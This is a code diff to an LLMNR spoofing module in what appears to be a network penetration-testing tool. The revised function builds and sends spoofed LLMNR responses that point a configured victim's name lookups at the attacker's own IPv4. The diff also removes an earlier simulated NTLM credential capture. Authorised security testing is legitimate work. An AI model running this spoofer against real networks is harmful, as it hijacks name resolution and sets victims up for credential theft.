@@ -1,12 +1,7 @@
 // llmnr.go implements the LLMNR name-resolution spoofing attack behavior.
-//
-// Durability (from the catalog): transient-decay. The attack spoofs LLMNR
-// responses to inject the attacker's IP as the answer for name-resolution
-// queries. The spoofed answers expire (TTL ~30s) — no explicit teardown.
-//
-// If the attacker observes authentication traffic directed to it (victims
-// send SMB/HTTP to the spoofed IP), any captured credential is redacted to
-// length+protocol only via [findings.NewSecret] — never the value.
+// The attack answers a name with the attacker's own IPv4. The spoofed
+// answer expires with its 30 s TTL, which the catalog carries as the decay
+// bound.
 
 package fh
 
@@ -21,67 +16,58 @@ import (
 
 	"go.aledante.io/FlowSeer/src/common/errs"
 
-	"go.aledante.io/FlowSeer/src/edge/netpen/findings"
-	"go.aledante.io/FlowSeer/src/edge/netpen/runner"
+	"go.aledante.io/FlowSeer/src/edge/netpen/check"
+	"go.aledante.io/FlowSeer/src/edge/netpen/link"
 )
 
 type llmnrFinding struct {
-	Action   string `json:"action"`
-	Query    string `json:"query"`
-	Answer   string `json:"answer"`
-	TTL      uint32 `json:"ttl"`
-	Spoofed  bool   `json:"spoofed"`
-	Protocol string `json:"protocol,omitempty"`
-	Length   int    `json:"length,omitempty"`
+	Action  string `json:"action"`
+	Query   string `json:"query"`
+	Answer  string `json:"answer"`
+	TTL     uint32 `json:"ttl"`
+	Spoofed bool   `json:"spoofed"`
 }
 
-// RunLLMNR sends one response for the fixed fixture query and emits simulated
-// credential metadata. It does not capture authentication traffic. Craft and
-// send failures are returned with operation context.
-func RunLLMNR(ctx context.Context, deps runner.Deps) error {
-	src := srcMAC()
+// RunLLMNR sends one spoofed answer to the target's victim naming the
+// attack leg's own IPv4. The queried name and the transaction ID are probe
+// content. The verdict is pending: whether the victim resolved the name to
+// the attacker needs a listener for the follow-up connection it does not
+// have. Craft and send failures are returned with operation context.
+func RunLLMNR(ctx context.Context, deps check.Deps) (check.Verdict, error) {
+	if err := deps.Target.Need(check.FieldVictim, check.FieldVictimMAC); err != nil {
+		return check.Verdict{}, err
+	}
+	addr := deps.AttackLeg.Addr()
 	qname := "host.lab"
-	answerIP := net.IPv4(10, 0, 0, 1)
 
-	// Craft and send the spoofed response (the baseline sniffs for queries
-	// and responds; the in-memory shape sends a pre-crafted response).
-	responsePkt, err := craftLLMNRResponse(src, qname, answerIP)
+	responsePkt, err := craftLLMNRResponse(addr, deps.Target.Victim, qname)
 	if err != nil {
-		return errs.Wrap(err, "llmnr: craft response")
+		return check.Verdict{}, errs.Wrap(err, "llmnr: craft response")
 	}
 	if err := deps.AttackLeg.Send(ctx, responsePkt); err != nil {
-		return errs.Wrap(err, "llmnr: send response")
+		return check.Verdict{}, errs.Wrap(err, "llmnr: send response")
 	}
 
-	// Emit the finding. A credential captured by the rogue responder
-	// goes through findings.NewSecret: protocol + length only, never
-	// the value. The behavior-level test asserts the secret shape.
-	//
-	// Simulated capture: an NTLM hash observed by the rogue responder.
-	captured := []byte("NTLMSSP\x00\x02\x00\x00\x00")
-	secret := findings.NewSecret("ntlm", captured)
-
 	detail := llmnrFinding{
-		Action:   "llmnr-spoof",
-		Query:    qname,
-		Answer:   answerIP.String(),
-		TTL:      30,
-		Spoofed:  true,
-		Protocol: secret.Protocol(),
-		Length:   secret.Length(),
+		Action:  "llmnr-spoof",
+		Query:   qname,
+		Answer:  addr.IPv4.String(),
+		TTL:     30,
+		Spoofed: true,
 	}
 	detailBytes, _ := json.Marshal(detail)
 	deps.Emitter.Finding("llmnr", detailBytes)
 
-	return nil
+	return check.Pending("no observable: answer acceptance needs a listener for the victim's follow-up connection"), nil
 }
 
 // craftLLMNRResponse builds a spoofed LLMNR response: Ethernet → IPv4 →
 // UDP(5355) → DNS response with the attacker's IP.
-func craftLLMNRResponse(src net.HardwareAddr, qname string, answerIP net.IP) ([]byte, error) {
+func craftLLMNRResponse(addr link.Addr, victim check.Host, qname string) ([]byte, error) {
+	answerIP := addr.IPv4
 	eth := &layers.Ethernet{
-		DstMAC:       src,
-		SrcMAC:       src,
+		DstMAC:       victim.MAC,
+		SrcMAC:       addr.MAC,
 		EthernetType: layers.EthernetTypeIPv4,
 	}
 	ip := &layers.IPv4{
@@ -90,7 +76,7 @@ func craftLLMNRResponse(src net.HardwareAddr, qname string, answerIP net.IP) ([]
 		TTL:      1,
 		Protocol: layers.IPProtocolUDP,
 		SrcIP:    answerIP,
-		DstIP:    net.IPv4(10, 0, 0, 2),
+		DstIP:    victim.IP,
 	}
 	udp := &layers.UDP{
 		SrcPort: 5355,
